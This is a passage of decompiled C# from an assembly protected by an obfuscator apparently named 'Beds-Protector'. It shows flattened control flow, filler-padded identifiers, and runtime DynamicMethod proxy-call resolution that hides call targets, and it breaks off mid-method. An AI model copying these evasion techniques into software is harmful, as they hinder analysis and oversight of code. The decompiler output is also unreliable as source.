  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogEThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogEᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] bool obj1)
  {
    int num = 9299 - 80504 + 71205;
    do
    {
      if (num == 52668 + 44739 - 97406)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogYAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogYAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.èªM\u002A\u00B1(obj0, obj1);
        num = 89589 - 73775 - 15812;
      }
      if (num == 69871 - 45166 - 24705)
        num = 26570 - 39412 + 12843;
    }
    while (num != 24858 - 44723 + 19867);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogfThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogfᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] object obj1)
  {
    int num = 80958 - 103051 + 22093;
    do
    {
      if (num == 23396 - 98808 + 75413)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog2AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog2AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.véAS\u0004(obj0, obj1);
        num = 51293 - 2675 - 48616;
      }
      if (num == 22296 - 60419 + 38123)
        num = 96189 - 46182 - 50006;
    }
    while (num != 98008 - 115739 + 17733);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogFThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogFᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0)
  {
    int num = 95273 - 35035 - 60238;
    do
    {
      if (num == 47559 - 105340 + 57781)
        num = 15873 + 67517 - 83389;
    }
    while (num != 24960 - 65313 + 40354);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogwAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogwAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.ç\u00D7ÚÞN(obj0);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoggThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoggᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] bool obj1)
  {
    int num = 51036 - 115902 + 64866;
    do
    {
      if (num == 28215 + 57524 - 85738)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogYAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogYAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u00ABø\u0014Íä(obj0, obj1);
        num = 88749 - 182790 + 94043;
      }
      if (num == 95791 - 123838 + 28047)
        num = 48789 - 76292 + 27504;
    }
    while (num != 77688 - 150624 + 72938);
  }

  static object Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogGThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogGᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ()
  {
    int num = 74699 - 48531 - 26168;
    do
    {
      if (num == 95109 - 14175 - 80934)
        num = 59628 - 38005 - 21622;
    }
    while (num != 64312 - 121231 + 56920);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog3AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog3AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0028\u00A4BxÊ();
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoghThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoghᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0,
    [In] object obj1)
  {
    int num = 92023 - 46408 - 45615;
    do
    {
      if (num == 8262 - 19747 + 11486)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog2AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog2AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Ò\u003Aó\u00B8\u0023(obj0, obj1);
        num = 73257 - 59946 - 13309;
      }
      if (num == 21522 + 64268 - 85790)
        num = 23689 - 36720 + 13032;
    }
    while (num != 32191 - 32903 + 714);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogHThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogHᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0)
  {
    int num = 30276 - 95957 + 65681;
    do
    {
      if (num == 10451 - 57261 + 46811)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog8AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog8AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Ä\u007Bò\u001AÚ(obj0);
        num = 14186 - 46796 + 32612;
      }
      if (num == 83932 - 183679 + 99747)
        num = 64115 - 34091 - 30023;
    }
    while (num != 29993 + 37123 - 67114);
  }

  static bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogiThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogiᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ()
  {
    int num = 13602 + 82431 - 96033;
    do
    {
      if (num == 18998 + 16018 - 35016)
        num = 59628 - 40325 - 19302;
    }
    while (num != 40377 - 70479 + 30103);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog9AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog9AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u001A\u003BÛ\u005E\u00AF();
  }

  static bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogIThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogIᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ()
  {
    int num = 67901 - 33273 - 34628;
    do
    {
      if (num == 45143 + 20907 - 66050)
        num = 91239 - 167308 + 76070;
    }
    while (num != 98804 - 114135 + 15332);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog9AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog9AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.µ\u00A5\u008B\u009FK();
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogjThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogjᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] string obj0)
  {
    int num = 78873 - 119642 + 40769;
    do
    {
      if (num == 71262 + 13561 - 84822)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogTAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogTAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Z_ü\u001A_(obj0);
        num = 55767 - 151478 + 95713;
      }
      if (num == 12324 + 45918 - 58242)
        num = 80717 + 4681 - 85397;
    }
    while (num != 30664 - 70491 + 39829);
  }

  static bool Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogJThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogJᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] object obj0)
  {
    int num = 27509 - 112016 + 84507;
    do
    {
      if (num == 67948 + 2509 - 70457)
        num = 25282 + 65119 - 90400;
    }
    while (num != 63972 - 41775 - 22196);
    return Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogebThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogebᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u0003\u0028\u0029ËÆ(obj0);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] string obj0)
  {
    int num = 91043 - 137494 + 46451;
    do
    {
      if (num == 80700 - 65593 - 15106)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogTAThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogTAᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.\u007F\u00B6\u00A9\u008A\u002C(obj0);
        num = 94246 - 83965 - 10279;
      }
      if (num == 34479 - 119332 + 84853)
        num = 43290 + 34389 - 77678;
    }
    while (num != 76385 - 56605 - 19778);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogKThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogKᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0)
  {
    int num = 80653 - 111402 + 30749;
    do
    {
      if (num == 36240 - 56505 + 20266)
      {
        Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog8AThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog8AᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ.Ì\u002Dù\u00AB\u002F(obj0);
        num = 30825 - 104117 + 73294;
      }
      if (num == 70311 - 13367 - 56944)
        num = 94421 - 135102 + 40682;
    }
    while (num != 73517 - 139646 + 66131);
  }

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog5bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog5bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 65322 + 11791 - 77113;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    MethodBase method;
    MethodInfo methodInfo;
    DynamicMethod dynamicMethod;
    Type declaringType;
    Type fieldType;
    do
    {
      ParameterInfo[] parameters;
      byte[] numArray;
      int num2;
      int metadataToken;
      if (num1 != 70290 - 65514 - 4755)
      {
        if (num1 == 99653 - 193680 + 94046)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 92779 - 119740 + 26981;
        }
        if (num1 == 70622 - 155927 + 85309)
        {
          int num3;
          int num4;
          int num5;
          int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[0] ^ (int) numArray[num3 = num2 - 1]) << 24) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 16) + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num5 = num4 - 1]) << 8);
          int num7 = num5 - 1;
          int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 0;
          metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog6bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog6bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
          num1 = 91447 - 103774 + 12332;
        }
        if (num1 != 34619 + 26185 - 60780)
          goto label_9;
      }
      int index1;
      if (index1 >= parameterTypes.Length)
        num1 = 55838 + 41812 - 97625;
      else
        goto label_40;
label_9:
      if (num1 == 39486 + 53335 - 92815)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 44171 - 111273 + 67109;
      }
      if (num1 == 11546 - 103768 + 92245)
      {
        ++index1;
        num1 = 42665 - 18485 - 24156;
      }
      if (num1 == 52274 + 25993 - 78265)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 31067 - 22820 - 8244;
      }
      int index2;
      if (num1 == 79247 - 138940 + 59707)
      {
        index2 = 0;
        num1 = 29962 - 21473 - 8474;
      }
      if (num1 == 55372 - 55425 + 71)
      {
        parameters = methodInfo.GetParameters();
        num1 = 53799 - 127886 + 74106;
      }
      if (num1 == 16332 - 3844 - 12483)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 7130 - 60095 + 52971;
      }
      if (num1 == 96383 - 103627 + 7247)
      {
        num2 = numArray.Length;
        num1 = 26937 - 51072 + 24139;
      }
      if (num1 == 38234 + 34735 - 72957)
      {
        parameterTypes = (Type[]) null;
        num1 = 61153 - 109253 + 48113;
      }
      MethodInfo[] methods;
      if (num1 == 34066 - 52755 + 18702)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 52536 - 98924 + 46402;
      }
      if (num1 == 37917 - 21648 - 16259)
        return;
      if (num1 != 67038 - 146015 + 78988)
        goto label_30;
label_29:
      dynamicMethod = (DynamicMethod) null;
      num1 = 63757 + 18138 - 81883;
label_30:
      if (num1 == 18802 + 11673 - 30474)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 50397 + 25294 - 75689;
      }
      if (num1 == 996 - 97286 + 96298)
      {
        if (method.IsStatic)
          num1 = 35567 - 131398 + 95840;
        else
          goto label_29;
      }
      if (num1 != 35517 - 52118 + 16617)
        goto label_37;
label_36:
      methodInfo = methods[index2];
      num1 = 38546 + 51958 - 90487;
label_37:
      if (num1 == 55404 - 121293 + 65914)
      {
        declaringType = method.DeclaringType;
        num1 = 66080 - 118896 + 52842;
      }
      if (num1 != 29994 + 36711 - 66683)
        goto label_41;
label_40:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 28446 - 51909 + 23486;
label_41:
      if (num1 == 45151 - 43509 - 1625)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 91073 - 44465 - 46590;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 != 42811 + 17638 - 60434)
      {
        if (num1 == 50103 - 21951 - 28145)
        {
          fieldType = fieldFromHandle.FieldType;
          num1 = 74170 + 20418 - 94580;
        }
        if (num1 == 62184 - 24151 - 38013)
        {
          index1 = 0;
          num1 = 88500 - 151015 + 62536;
        }
        if (num1 == 33690 + 15969 - 49650)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 77631 - 100262 + 22641;
        }
        if (num1 == 9006 - 101416 + 92410)
          num1 = 72812 - 151441 + 78630;
        continue;
      }
label_57:
      if (index2 < methods.Length)
        goto label_36;
      else
        goto label_58;
    }
    while (num1 != 94215 - 49452 - 44737);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog6bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog6bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog7bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog7bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 70026 - 59066 - 10960;
    MethodBase method;
    Type declaringType;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    Type fieldType;
    MethodInfo methodInfo;
    DynamicMethod dynamicMethod;
    do
    {
      if (num1 == 30053 - 17772 - 12256)
      {
        declaringType = method.DeclaringType;
        num1 = 11230 + 55659 - 66863;
      }
      byte[] numArray;
      int num2;
      if (num1 == 38525 + 24697 - 63219)
      {
        num2 = numArray.Length;
        num1 = 72102 - 116917 + 44819;
      }
      ParameterInfo[] parameters;
      if (num1 == 85473 - 139316 + 53862)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 39088 - 42956 + 3888;
      }
      if (num1 != 96940 - 76727 - 20189)
        goto label_10;
label_8:
      int index1;
      if (index1 >= parameterTypes.Length)
        num1 = 41221 + 37793 - 78989;
      else
        goto label_21;
label_10:
      int metadataToken;
      if (num1 == 17844 - 29771 + 11933)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 49515 - 45130 - 4378;
      }
      if (num1 == 49843 - 130601 + 80760)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 27052 - 77392 + 50343;
      }
      if (num1 == 50280 - 79875 + 29615)
      {
        index1 = 0;
        num1 = 82786 - 155055 + 72290;
      }
      if (num1 == 59421 - 53127 - 6287)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 47591 - 81348 + 33765;
      }
      if (num1 != 24767 - 94092 + 69341)
        goto label_20;
label_19:
      MethodInfo[] methods;
      int index2;
      methodInfo = methods[index2];
      num1 = 40849 - 135145 + 94313;
label_20:
      if (num1 != 90771 - 169133 + 78384)
        goto label_22;
label_21:
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 5442 + 33266 - 38685;
label_22:
      if (num1 == 54930 - 145006 + 90089)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 15278 + 58840 - 74104;
      }
      if (num1 == 64058 - 162252 + 98204)
        return;
      if (num1 == 12816 + 74272 - 87071)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 47899 - 144983 + 97102;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 72701 - 162629 + 89951)
      {
        ++index1;
        num1 = 78167 - 7067 - 71076;
      }
      if (num1 != 35037 - 15955 - 19071)
        goto label_32;
label_31:
      dynamicMethod = (DynamicMethod) null;
      num1 = 86446 - 20248 - 66186;
label_32:
      if (num1 != 71958 - 49448 - 22495)
      {
        if (num1 == 82200 - 67544 - 14644)
        {
          parameterTypes = (Type[]) null;
          num1 = 32183 - 61089 + 28919;
        }
        if (num1 == 30765 + 35561 - 66318)
        {
          if (method.IsStatic)
            num1 = 54548 - 113471 + 58932;
          else
            goto label_31;
        }
        if (num1 == 6661 + 7241 - 13888)
        {
          index2 = 0;
          num1 = 81281 - 148828 + 67562;
        }
        if (num1 == 48733 - 99150 + 50435)
        {
          parameters = methodInfo.GetParameters();
          num1 = 19012 - 5728 - 13265;
        }
        if (num1 == 55033 - 77168 + 22139)
        {
          int num3;
          int num4;
          int num5;
          int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num5 = num4 - 1]) << 0);
          int num7 = num5 - 1;
          int num8 = ((int) fieldFromHandle.Name[0] ^ (int) numArray[num2 = num7 - 1]) << 24;
          metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDog8bThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDog8bᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
          num1 = 39782 + 32017 - 71794;
        }
        if (num1 != 92297 - 178574 + 86298)
        {
          if (num1 == 4266 + 82458 - 86719)
          {
            metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
            num1 = 61032 - 57528 - 3498;
          }
          if (num1 == 4757 - 47172 + 42416)
          {
            fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
            num1 = 60138 - 153544 + 93408;
          }
          if (num1 == 52298 - 108738 + 56449)
          {
            fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
            num1 = 54932 - 3830 - 51092;
          }
          if (num1 == 27316 - 104095 + 76779)
            num1 = 1378 - 7297 + 5920;
          continue;
        }
        goto label_8;
      }
label_57:
      if (index2 < methods.Length)
        goto label_19;
      else
        goto label_58;
    }
    while (num1 != 82934 + 6780 - 89688);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
